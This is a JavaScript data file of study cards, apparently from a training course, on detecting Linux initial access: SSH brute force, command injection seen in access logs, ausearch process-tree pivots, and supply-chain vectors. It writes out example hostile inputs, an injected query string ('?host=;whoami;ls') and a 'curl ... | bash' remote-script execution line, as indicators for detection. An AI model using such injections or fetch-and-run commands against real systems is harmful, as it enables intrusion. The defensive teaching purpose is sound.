export default {
  id: "linux-initial-access",
  title: "Linux Initial Access Detection",
  src: "Linux Threat Detection 1",
  icon: "🔓",
  cards: [
    {
      title: "SSH breach — the RDP equivalent",
      span2: true,
      blocks: [
        { t: "txt", text: "SSH and RDP share the same MITRE technique, T1133 External Remote Services. 40M+ SSH-exposed hosts on Shodan (2025). Two ways in: a stolen key (leaked in a repo/Ansible server, exfiltrated off an admin's laptop) or a breached password (weak test password left in place, forgotten exposure)." },
        { t: "table", head: ["Step", "grep target"], rows: [
          ["Brute force", "\"Failed password\" — multiple usernames tried in sequence is the tell"],
          ["Successful login", "\"Accepted password\" / \"Accepted publickey\""],
        ]},
        { t: "note", kind: "warn", title: "three red flags for judging a successful login", text: "Password-based (vs. key-based) auth, source is an external/untrusted IP, and anomalous timing for that account (a service account logging in at a consistent daily time reads as automation; a human account logging in at 3AM from an unfamiliar IP doesn't)." },
        { t: "note", kind: "info", title: "investigative checklist once a login looks suspicious", text: "Who owns the account and would they expect this login? What do threat-intel/asset-lookup tools say about the source IP? Was it preceded by brute-force noise? Should you now pivot to analyzing what that session did?" },
      ],
    },
    {
      title: "Exposed-service compromise (T1190)",
      span2: true,
      blocks: [
        { t: "txt", text: "Same MITRE technique as Windows' vulnerable mail server, Linux-flavored. Any public-facing app is a risk surface — real examples: Zimbra CVE (arbitrary OS command execution), exposed Docker API (cloud breach entry point), Palo Alto firewall CVE (full OS control), WordPress plugins (web shell uploads)." },
        { t: "note", kind: "warn", title: "app logs rarely self-report a zero-day", text: "But they still leave usable artifacts — worked example: a \"ping a host\" web app passes input straight into a shell (ping -c2 <input>) with no sanitization. In the access log, this shows up as Linux commands appearing inside query parameters instead of an IP (?host=;whoami;ls instead of ?host=8.8.8.8) — the query string itself is the IOC." },
      ],
    },
    {
      title: "Process tree reconstruction — the universal detector",
      span2: true,
      blocks: [
        { t: "cmd", label: "find the suspicious command", code: "ausearch -i -x whoami" },
        { t: "cmd", label: "walk the parent chain", code: "ausearch -i -p <ppid>" },
        { t: "cmd", label: "list everything the root process spawned", code: "ausearch -p <ppid> | grep proctitle" },
        { t: "note", kind: "info", title: "same technique as the Windows ProcessId/ParentProcessId pivot", text: "Walk ppid → ppid until reaching PID 1 (systemd) or a recognizable root cause (web app, SSH session, cron job). Once the root is identified, list its children to see the full compromise chain — not just the one alerting command (e.g. \"why did the ping app run whoami\" escalating to finding a curl-to-C2 pulling a payload piped into sh)." },
      ],
    },
    {
      title: "Advanced / human-led & supply-chain vectors",
      span2: true,
      blocks: [
        { t: "table", head: ["Vector", "Pattern"], rows: [
          ["Unvetted script execution", "curl https://forum.thm/fix.sh | bash — nothing inspected before executing"],
          ["Package typosquatting", "pip install fastapi mistyped to a similar malicious package name, deliberately published to catch typos"],
          ["Supply-chain compromise", "a trusted dependency gets backdoored upstream; every downstream user inherits it on next update (real: xz-utils backdoor, GitHub Actions secret leak)"],
        ]},
        { t: "note", kind: "danger", title: "the tell that separates supply-chain compromise from the rest", text: "A normally-trusted app/service suddenly runs unusual commands with no external trigger (no SSH login, no incoming request). Process-tree root cause traces to systemd/the service itself, not to an identifiable external actor — the malicious code shipped inside the trusted software's own update." },
      ],
    },
  ],
};
